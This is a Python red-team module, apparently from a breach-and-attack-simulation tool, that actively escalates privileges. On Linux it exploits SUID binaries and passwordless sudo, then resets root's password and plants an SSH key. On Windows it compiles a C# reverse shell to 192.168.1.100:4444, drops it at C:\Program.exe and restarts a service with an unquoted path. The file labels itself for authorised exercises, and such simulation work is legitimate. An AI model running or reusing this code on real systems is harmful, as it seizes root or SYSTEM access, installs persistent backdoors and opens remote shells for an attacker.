"""
Privilege Escalation – RED TEAM (active exploitation)
MITRE ATT&CK: T1068, T1548, T1574

WARNING: This module actually exploits vulnerabilities and takes over the system.
Only use in authorised red‑team exercises.
"""

import asyncio
import os
import logging
import platform
import tempfile
from typing import List

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.privesc.red")


class PrivEscModule(BaseAttackModule):
    MODULE_NAME  = "privilege_escalation"
    DESCRIPTION  = "Active privilege escalation (red team)"
    MITRE_TACTIC = "Privilege Escalation"
    MITRE_IDS    = ["T1068", "T1548", "T1548.001", "T1574.009"]

    async def execute(self) -> List[Finding]:
        findings = []
        system = platform.system()
        if system == "Linux":
            findings.extend(await self._linux_exploit())
        elif system == "Windows":
            findings.extend(await self._windows_exploit())
        else:
            findings.append(self.finding(
                title="Unsupported OS",
                description=f"Exploits not implemented for {system}",
                severity=Severity.INFO,
                mitre_id="N/A",
                evidence=f"OS: {system}",
                remediation="Run on Linux or Windows.",
                mode="red",
                evidence_type="exploit"
            ))
        return findings

    # ─── Linux Exploits ───────────────────────────────────────────

    async def _linux_exploit(self) -> List[Finding]:
        findings = []
        findings.extend(await self._exploit_suid())
        findings.extend(await self._exploit_sudo_nopasswd())
        return findings

    async def _exploit_suid(self) -> List[Finding]:
        findings = []
        try:
            result = await self._run_cmd(
                "find / -perm -4000 -type f 2>/dev/null | head -50"
            )
            gtfobins = {
                "nmap": "--interactive",
                "find": "-exec /bin/sh \\;",
                "vim": "-c ':!/bin/sh'",
                "python": "-c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
                "ruby": "-e 'exec \"/bin/sh\"'",
                "perl": "-e 'exec \"/bin/sh\";'",
                "awk": 'BEGIN {system("/bin/sh")}',
                "bash": "-p",
                "sh": "-p",
                "env": "/bin/sh",
            }

            for line in result.splitlines():
                binary = line.strip()
                if not binary:
                    continue
                base = os.path.basename(binary)
                if base in gtfobins:
                    cmd = f"{binary} {gtfobins[base]}"
                    logger.warning(f"Exploiting SUID: {cmd}")
                    proc = await asyncio.create_subprocess_shell(
                        cmd,
                        stdin=asyncio.subprocess.PIPE,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    backdoor = (
                        "echo 'root:$1$Hacker$Xyz123' | chpasswd 2>/dev/null; "
                        "mkdir -p /root/.ssh; "
                        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...redteam@attacker' >> /root/.ssh/authorized_keys; "
                        "exit\n"
                    )
                    stdout, stderr = await asyncio.wait_for(
                        proc.communicate(input=backdoor.encode()),
                        timeout=10
                    )
                    if proc.returncode == 0:
                        findings.append(self.finding(
                            title=f"SUID Exploit Successful: {base}",
                            description=f"Exploited {binary} to gain root and planted backdoor SSH key.",
                            severity=Severity.CRITICAL,
                            mitre_id="T1548.001",
                            evidence=f"Command: {cmd}\nOutput: {stdout.decode(errors='replace')}",
                            remediation="Remove SUID bits and review system compromise.",
                            mode="red",
                            evidence_type="exploit"
                        ))
                    else:
                        findings.append(self.finding(
                            title=f"SUID Exploit Failed: {base}",
                            description=f"Failed to exploit {binary}.",
                            severity=Severity.MEDIUM,
                            mitre_id="T1548.001",
                            evidence=stderr.decode(errors='replace'),
                            remediation="Check binary permissions.",
                            mode="red",
                            evidence_type="exploit"
                        ))
        except Exception as e:
            logger.error(f"SUID exploitation error: {e}")
        return findings

    async def _exploit_sudo_nopasswd(self) -> List[Finding]:
        findings = []
        try:
            result = await self._run_cmd("sudo -l -n 2>/dev/null || true")
            if "NOPASSWD" in result and "(ALL)" in result:
                logger.warning("Exploiting passwordless sudo")
                proc = await asyncio.create_subprocess_shell(
                    "sudo su -",
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                backdoor = (
                    "echo 'root:$1$Hacker$Xyz123' | chpasswd; "
                    "mkdir -p /root/.ssh; "
                    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...redteam@attacker' >> /root/.ssh/authorized_keys; "
                    "exit\n"
                )
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(input=backdoor.encode()),
                    timeout=10
                )
                if proc.returncode == 0:
                    findings.append(self.finding(
                        title="Passwordless Sudo Exploit Successful",
                        description="Gained root via NOPASSWD sudo and planted persistent backdoor.",
                        severity=Severity.CRITICAL,
                        mitre_id="T1548.003",
                        evidence="sudo su - executed successfully.",
                        remediation="Remove NOPASSWD entries.",
                        mode="red",
                        evidence_type="exploit"
                    ))
        except Exception as e:
            logger.error(f"Sudo exploitation error: {e}")
        return findings

    # ─── Windows Exploits ─────────────────────────────────────────

    async def _windows_exploit(self) -> List[Finding]:
        findings = []
        findings.extend(await self._exploit_unquoted_service_path())
        return findings

    async def _exploit_unquoted_service_path(self) -> List[Finding]:
        findings = []
        try:
            # Check if we can write to C:\
            try:
                test_file = "C:\\test_write.txt"
                with open(test_file, 'w') as f:
                    f.write("test")
                os.remove(test_file)

                # Drop reverse shell payload
                payload_path = "C:\\Program.exe"
                cs_code = """
using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.IO;
class Program {
    static void Main() {
        try {
            TcpClient client = new TcpClient("192.168.1.100", 4444);
            Stream stream = client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            while (true) {
                string cmd = reader.ReadLine();
                if (cmd == null) break;
                p.StandardInput.WriteLine(cmd);
                string output = p.StandardOutput.ReadToEnd();
                writer.Write(output);
                writer.Flush();
            }
        } catch {}
    }
}
"""
                with tempfile.NamedTemporaryFile(suffix='.cs', delete=False) as cs_file:
                    cs_file.write(cs_code.encode())
                    cs_path = cs_file.name

                compile_cmd = f"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{payload_path} {cs_path}"
                proc = await asyncio.create_subprocess_shell(
                    compile_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await proc.communicate()
                os.remove(cs_path)

                if os.path.exists(payload_path):
                    # Restart a vulnerable service (first one found)
                    restart_ps = """
                    $services = Get-WmiObject Win32_Service | Where-Object {
                        $_.PathName -match '^[^"]* .*' -and $_.PathName -notmatch '^"'
                    } | Select-Object -ExpandProperty Name
                    if ($services) {
                        $service = $services[0]
                        Stop-Service $service -Force -ErrorAction SilentlyContinue
                        Start-Service $service -ErrorAction SilentlyContinue
                        Write-Output "Restarted $service"
                    }
                    """
                    restart_out = await self._run_powershell(restart_ps)
                    findings.append(self.finding(
                        title="Unquoted Service Path Exploit Successful",
                        description=f"Dropped reverse shell at {payload_path} and restarted vulnerable service.\n{restart_out}",
                        severity=Severity.CRITICAL,
                        mitre_id="T1574.009",
                        evidence=f"Payload: {payload_path}\nCompile: {stderr.decode(errors='replace')}",
                        remediation="Quote service paths and restrict write permissions.",
                        mode="red",
                        evidence_type="exploit"
                    ))
                else:
                    findings.append(self.finding(
                        title="Unquoted Service Path Exploit Failed",
                        description="Could not compile or drop payload.",
                        severity=Severity.MEDIUM,
                        mitre_id="T1574.009",
                        evidence=stderr.decode(errors='replace'),
                        remediation="Ensure .NET Framework is installed.",
                        mode="red",
                        evidence_type="exploit"
                    ))
            except Exception as e:
                logger.error(f"Unquoted service path exploit error: {e}")
        except Exception as e:
            logger.error(f"Windows exploitation error: {e}")
        return findings

    # ─── Helpers ──────────────────────────────────────────────────

    async def _run_cmd(self, cmd: str) -> str:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        return stdout.decode(errors="replace")

    async def _run_powershell(self, command: str) -> str:
        cmd = ["powershell", "-NoProfile", "-Command", command]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
        return stdout.decode(errors="replace").strip()